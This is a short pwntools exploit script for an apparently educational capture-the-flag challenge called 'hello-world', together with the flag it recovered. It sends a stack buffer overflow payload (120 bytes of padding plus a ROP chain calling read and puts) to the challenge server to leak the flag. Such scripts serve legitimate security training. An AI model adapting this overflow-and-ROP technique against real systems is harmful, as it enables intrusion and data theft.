from pwn import *
import time

context.arch = 'amd64'

elf = ELF('./hello-world')

# p = elf.process()
p = remote('edu-ctf.zoolab.org', 30212)

print(p.recv())
time.sleep(0x10)
# raw_input()
p.send(b'\xff')

buf = 0x00404000 + 0x100
pop_rdi = 0x00000000004013a3
pop_rsi_r15 = 0x00000000004013a1
puts_addr = 0x0000000000401310
rop = flat([pop_rdi, 3, pop_rsi_r15, buf, 0, elf.plt['read'], pop_rdi, buf, puts_addr])

payload = b'a' * 120 + rop
# raw_input()
p.send(payload)

p.interactive()

#flag = FLAG{just warmup :)}